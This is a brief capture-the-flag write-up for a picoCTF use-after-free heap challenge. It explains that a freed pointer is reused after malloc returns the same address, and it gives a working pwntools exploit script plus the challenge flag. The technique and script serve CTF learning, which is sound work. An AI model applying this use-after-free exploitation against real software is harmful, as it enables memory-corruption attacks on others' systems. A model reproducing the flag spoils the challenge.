---
created: 2024-08-08T00:05
updated: 2024-08-08T00:19
---

> freed but still in use
> now memory untracked
> do you smell the bug?

`malloc` will return the same address if the previous address was freed.

But `check_win` still uses the same address of `x` to check for win.

We can simply overwrite the data at `x` by liberating it and allocating a new object over there.

```python
from pwn import *
s = remote("tethys.picoctf.net", 60691)
s.sendlineafter(b": ", b"5")
s.sendlineafter(b": ", b"2")
s.sendlineafter(b": ", b"35")
s.sendlineafter(b": ", b"a"*30+b'pico')
s.sendlineafter(b": ", b"4")
info(s.recvall())
```

```flag
picoCTF{now_thats_free_real_estate_79173b73}
```

> Fun fact, size 40 also works.
